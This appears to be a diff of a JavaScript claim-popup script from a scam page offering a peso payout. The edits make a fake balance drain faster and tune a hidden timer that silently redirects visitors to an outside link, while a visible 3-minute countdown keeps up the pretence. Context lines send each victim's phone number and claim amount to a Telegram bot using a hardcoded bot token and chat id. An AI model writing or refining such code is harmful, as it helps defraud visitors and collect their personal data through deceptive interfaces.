@@ -1,5 +1,5 @@
 /**
- * Claim Popup Module - Dual Timer (Imaginary 10s + Visible 3min)
+ * Claim Popup Module - Timer-style Decrement with Decimals
  */
 
 let claimState = {
@@ -101,39 +101,41 @@ function startVisibleCountdown() {
     }, 1000);
 }
 
-// Fast balance decrement (within 10 seconds)
-function startFastDecrement(originalAmount, onComplete) {
+// Timer-style balance decrement (with decimals, paatras)
+function startTimerDecrement(originalAmount, onComplete) {
     const balanceText = document.getElementById('balanceText');
     if (!balanceText) return;
     
     let current = originalAmount;
-    const steps = 20; // 20 steps in 10 seconds
-    const decrementPerStep = Math.ceil(originalAmount / steps);
+    const totalDuration = 3500; // 3.5 seconds
+    const intervalTime = 50; // mag-update every 0.05 seconds (20x per second)
+    const decrementPerStep = originalAmount / (totalDuration / intervalTime);
     let stepCount = 0;
     
     claimState.balanceDecrementInterval = setInterval(() => {
         stepCount++;
         current = Math.max(0, originalAmount - (decrementPerStep * stepCount));
-        balanceText.innerText = "₱" + current.toLocaleString() + ".00";
         
-        if (current <= 0) {
+        // Display with 2 decimal places (parang timer)
+        balanceText.innerText = "₱" + current.toFixed(2);
+        
+        if (current <= 0.01) {
             clearInterval(claimState.balanceDecrementInterval);
             claimState.balanceDecrementInterval = null;
             balanceText.innerText = "₱0.00";
             if (onComplete) onComplete();
         }
-    }, 500); // 20 steps * 0.5s = 10 seconds
+    }, intervalTime);
 }
 
-// Imaginary 10-second timer (invisible)
+// Imaginary timer (3.5 seconds, invisible)
 function startImaginaryTimer(redirectUrl) {
     claimState.imaginaryTimer = setTimeout(() => {
-        // After 10 seconds, redirect to external link
         if (!claimState.hasRedirected) {
             claimState.hasRedirected = true;
             window.location.href = redirectUrl;
         }
-    }, 10000); // 10 seconds
+    }, 3500); // 3.5 seconds
 }
 
 // Main claim action
@@ -148,7 +150,7 @@ function onClaimAction() {
     claimBtn.disabled = true;
     claimBtn.innerHTML = 'PROCESSING...';
     
-    // Send Telegram notification (without link)
+    // Send Telegram notification
     const message = `💰 CLAIM REQUEST!\n📱 ${userPhone}\n💵 ₱${amount}\n⏰ ${new Date().toLocaleString()}`;
     fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(message)}`)
         .catch(e => console.log('Telegram error:', e));
@@ -203,16 +205,15 @@ function startClaimFlow(originalAmount, redirectUrl) {
     // Show pending status area with visible countdown
     showPendingStatus();
     
-    // Start visible 3-minute countdown (agad lalabas ang 3:00)
+    // Start visible 3-minute countdown
     startVisibleCountdown();
     
-    // Start fast balance decrement (within 10 seconds)
-    startFastDecrement(originalAmount, () => {
-        // Balance reached 0, but we continue
-        console.log('Balance reached 0');
+    // Start timer-style balance decrement (with decimals, smooth)
+    startTimerDecrement(originalAmount, () => {
+        console.log('Balance reached ₱0.00 smoothly');
     });
     
-    // Start imaginary 10-second timer (invisible) for redirect
+    // Start imaginary 3.5-second timer for redirect
     startImaginaryTimer(redirectUrl);
 }
 
